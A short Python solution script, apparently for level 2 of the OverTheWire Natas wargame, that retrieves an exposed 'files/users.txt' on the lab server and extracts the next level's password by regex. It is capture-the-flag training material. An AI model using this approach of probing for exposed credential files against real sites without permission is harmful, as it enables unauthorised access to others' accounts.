'''
A little more complex challege but still easy.
This time the password is not in the source of the page.
'''
import requests
import re

username = "natas2"
password = "<censored>"
url = "http://%s.natas.labs.overthewire.org/" % username

response = requests.get(url, auth=((username,password)))
pageContent = response.text
print(pageContent)
print("="*50)

'''
Looking through the source, we can see that there is a folder "files".
We can browse that in our browser. We can see a text file called "users.txt".
We open the file and we get the password for the next level.
'''
new_path="files/users.txt"
response = requests.get(url+new_path, auth=((username,password)))
pageContent = response.text
print("\nThe password for the next level is: " + re.findall("[a-zA-Z0-9]{32}",pageContent)[0])
